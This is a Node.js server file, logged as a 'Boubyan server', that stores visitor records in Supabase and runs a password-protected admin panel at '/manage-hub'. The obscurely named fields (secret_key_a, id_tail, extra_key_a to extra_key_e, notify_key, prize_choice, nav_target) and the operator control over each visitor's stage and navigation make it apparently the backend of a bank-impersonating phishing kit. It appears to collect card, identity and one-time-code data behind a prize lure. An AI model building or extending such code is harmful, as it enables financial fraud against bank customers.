import http from "node:http";
import { randomBytes, randomUUID } from "node:crypto";
import fs from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createServer as createViteServer } from "vite";
import { createClient } from "@supabase/supabase-js";
import { createHmac, timingSafeEqual } from "node:crypto";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const isDev = process.argv[2] === "dev";
const port = Number(process.env.PORT || (isDev ? 5173 : 3000));
const adminPassword = process.env.ADMIN_PASSWORD || null;

const SUPABASE_URL = "https://yfdjhehhjvfwlevndxlm.supabase.co";
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || null;

const db = SUPABASE_SERVICE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, { auth: { persistSession: false } })
  : null;

const json = (res, status, body) => {
  res.statusCode = status;
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.end(JSON.stringify(body));
};

const readBody = async (req) => {
  let raw = "";
  for await (const chunk of req) raw += chunk;
  if (!raw) return {};
  try { return JSON.parse(raw); } catch { throw new Error("invalid_json"); }
};

// ── Admin session — cookie موقّعة بـ HMAC (تعيش 90 يوم، تنجو من restarts) ────
const SESSION_TTL_MS = 90 * 24 * 60 * 60 * 1000; // 90 يوم

function signAdminToken(password) {
  const exp = Date.now() + SESSION_TTL_MS;
  const payload = Buffer.from(JSON.stringify({ exp })).toString("base64url");
  const sig = createHmac("sha256", password).update(payload).digest("base64url");
  return `${payload}.${sig}`;
}

function verifyAdminToken(token, password) {
  if (!token || !password) return false;
  const dot = token.lastIndexOf(".");
  if (dot === -1) return false;
  const payload = token.slice(0, dot);
  const sig = token.slice(dot + 1);
  const expected = createHmac("sha256", password).update(payload).digest("base64url");
  try {
    if (!timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) return false;
  } catch { return false; }
  const { exp } = JSON.parse(Buffer.from(payload, "base64url").toString());
  return Date.now() < exp;
}

function getAdminCookieToken(req) {
  const cookie = req.headers.cookie || "";
  const match = cookie.match(/(?:^|;\s*)__asid=([^;]+)/);
  return match ? decodeURIComponent(match[1]) : null;
}

const isAdmin = (req) => verifyAdminToken(getAdminCookieToken(req), adminPassword);

// ── Rate limiting ──────────────────────────────────────────────────────────────
const authRateLimits = new Map();
const RATE_LIMIT_MAX = 5;
const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000;

function checkRateLimit(ip) {
  const now = Date.now();
  const entry = authRateLimits.get(ip);
  if (!entry || now > entry.resetAt) {
    authRateLimits.set(ip, { count: 1, resetAt: now + RATE_LIMIT_WINDOW_MS });
    return true;
  }
  if (entry.count >= RATE_LIMIT_MAX) return false;
  entry.count++;
  return true;
}

const TABLE = "river_nodes";
const visitorColumns = "id, contact_ref, contact_name, contact_address, contact_extra, member_label, secret_key_a, id_tail, extra_key_a, extra_key_b, extra_key_c, extra_key_d, extra_key_e, notify_key, stage_key, stage_state, prize_choice, nav_target, last_seen_at, created_at, updated_at";
const publicVisitorColumns = "id, stage_state, nav_target, last_seen_at";
const allowedPatchFields = new Set([
  "contact_ref", "contact_name", "contact_address", "contact_extra", "member_label",
  "secret_key_a", "id_tail", "extra_key_a", "extra_key_b", "extra_key_c",
  "extra_key_d", "extra_key_e", "notify_key", "stage_key", "stage_state",
  "prize_choice", "nav_target", "last_seen_at",
]);

async function hasVisitorAccess(req, id) {
  if (!db) return false;
  const token = req.headers["x-visitor-token"];
  if (typeof token !== "string" || !token) return false;
  const { data } = await db.from(TABLE).select("id").eq("id", id).eq("visitor_token", token).single();
  return Boolean(data);
}

async function handleApi(req, res, url) {
  res.setHeader("Cache-Control", "no-store");
  if (req.method === "OPTIONS") { res.statusCode = 204; return res.end(); }

  // ── Admin login ───────────────────────────────────────────────────────────────
  if (url.pathname === "/api/admin/login") {
    if (req.method !== "POST") return json(res, 405, { error: "method_not_allowed" });
    const ip = req.socket?.remoteAddress || req.headers["x-forwarded-for"] || "unknown";
    if (!checkRateLimit(ip)) return json(res, 429, { error: "too_many_requests" });
    const body = await readBody(req);
    if (!adminPassword || body.password !== adminPassword) return json(res, 401, { error: "unauthorized" });
    const token = signAdminToken(adminPassword);
    res.setHeader("Set-Cookie", `__asid=${encodeURIComponent(token)}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${Math.floor(SESSION_TTL_MS / 1000)}`);
    return json(res, 200, { ok: true });
  }

  // ── Admin logout ──────────────────────────────────────────────────────────────
  if (url.pathname === "/api/admin/logout") {
    if (req.method !== "POST") return json(res, 405, { error: "method_not_allowed" });
    res.setHeader("Set-Cookie", "__asid=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0");
    return json(res, 200, { ok: true });
  }

  // ── Admin session check ───────────────────────────────────────────────────────
  if (url.pathname === "/api/admin/me") {
    if (req.method !== "GET") return json(res, 405, { error: "method_not_allowed" });
    return json(res, isAdmin(req) ? 200 : 401, { authenticated: isAdmin(req) });
  }

  if (!url.pathname.startsWith("/api/visitors")) return false;
  if (!db) return json(res, 503, { error: "database_not_configured" });

  try {
    const parts = url.pathname.split("/").filter(Boolean);
    const id = parts[2] || null;

    // GET all (admin only)
    if (req.method === "GET" && !id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      const { data, error } = await db.from(TABLE)
        .select(visitorColumns)
        .order("last_seen_at", { ascending: false })
        .order("created_at", { ascending: false });
      if (error) throw error;
      return json(res, 200, data ?? []);
    }

    // GET single
    if (req.method === "GET" && id) {
      const admin = isAdmin(req);
      if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
      const cols = admin ? visitorColumns : publicVisitorColumns;
      const { data, error } = await db.from(TABLE).select(cols).eq("id", id).single();
      if (error && error.code !== "PGRST116") throw error;
      return json(res, 200, data ?? null);
    }

    // POST (create)
    if (req.method === "POST" && !id) {
      const body = await readBody(req);
      const entries = Object.entries(body).filter(([k, v]) => allowedPatchFields.has(k) && v !== undefined);
      if (!body.contact_ref) return json(res, 400, { error: "contact_ref_required" });
      const newId = randomUUID();
      const newToken = randomBytes(32).toString("hex");
      const insertData = { id: newId, visitor_token: newToken, ...Object.fromEntries(entries) };
      const { data, error } = await db.from(TABLE).insert(insertData).select("id, visitor_token").single();
      if (error) throw error;
      return json(res, 201, data ?? null);
    }

    // PATCH (update)
    if (req.method === "PATCH" && id) {
      const admin = isAdmin(req);
      if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
      const body = await readBody(req);
      const entries = Object.entries(body).filter(([k, v]) => allowedPatchFields.has(k) && v !== undefined);
      if (!entries.length) return json(res, 400, { error: "empty_update" });
      const updateData = { ...Object.fromEntries(entries), updated_at: new Date().toISOString() };
      const cols = admin ? visitorColumns : publicVisitorColumns;
      const { data, error } = await db.from(TABLE).update(updateData).eq("id", id).select(cols).single();
      if (error) throw error;
      return json(res, 200, data ?? null);
    }

    // DELETE all (admin only)
    if (req.method === "DELETE" && !id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      const { error } = await db.from(TABLE).delete().not("id", "is", null);
      if (error) throw error;
      return json(res, 200, { ok: true });
    }

    // DELETE single (admin only)
    if (req.method === "DELETE" && id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      const { error } = await db.from(TABLE).delete().eq("id", id);
      if (error) throw error;
      return json(res, 200, { ok: true });
    }

    return json(res, 405, { error: "method_not_allowed" });
  } catch (error) {
    console.error("API error", error instanceof Error ? error.message : error);
    return json(res, 500, { error: "database_error" });
  }
}

async function serveStatic(req, res, url) {
  const requested = decodeURIComponent(url.pathname === "/" ? "/index.html" : url.pathname);
  const candidate = path.resolve(__dirname, "dist", `.${requested}`);
  const root = path.resolve(__dirname, "dist");
  const filePath = candidate === root || candidate.startsWith(`${root}${path.sep}`) ? candidate : null;
  const contentTypes = {
    ".html": "text/html; charset=utf-8", ".js": "application/javascript; charset=utf-8",
    ".mjs": "application/javascript; charset=utf-8", ".css": "text/css; charset=utf-8",
    ".json": "application/json; charset=utf-8", ".svg": "image/svg+xml",
    ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
    ".webp": "image/webp", ".gif": "image/gif", ".ico": "image/x-icon",
    ".txt": "text/plain; charset=utf-8",
  };
  try {
    const stat = filePath ? await fs.stat(filePath) : null;
    if (stat.isFile()) {
      const content = await fs.readFile(filePath);
      res.setHeader("Content-Type", contentTypes[path.extname(filePath).toLowerCase()] || "application/octet-stream");
      res.statusCode = 200;
      res.end(content);
      return;
    }
  } catch {}
  if (path.extname(requested)) {
    res.statusCode = 404;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.end("Not found");
    return;
  }
  const html = await fs.readFile(path.join(root, "index.html"));
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.statusCode = 200;
  res.end(html);
}

const vite = isDev
  ? await createViteServer({ server: { middlewareMode: true }, appType: "spa" })
  : null;

const ADMIN_PATH = "/manage-hub";

function addSecurityHeaders(res) {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  addSecurityHeaders(res);
  if (url.pathname === "/healthz") return json(res, 200, { ok: true, dbConfigured: Boolean(db) });
  if (url.pathname.startsWith("/api/")) {
    const handled = await handleApi(req, res, url);
    if (!handled && !res.writableEnded) json(res, 404, { error: "not_found" });
    return;
  }
  // الحماية على مستوى API — الصفحة تُخدَّم لكن البيانات محمية بكلمة المرور
  if (vite) { vite.middlewares(req, res, () => res.end()); return; }
  await serveStatic(req, res, url);
});

server.listen(port, "0.0.0.0", () => console.log(`Boubyan server listening on port ${port}`));

const shutdown = async () => { server.close(); if (vite) await vite.close(); };
process.on("SIGTERM", shutdown);
process.on("SIGINT", shutdown);
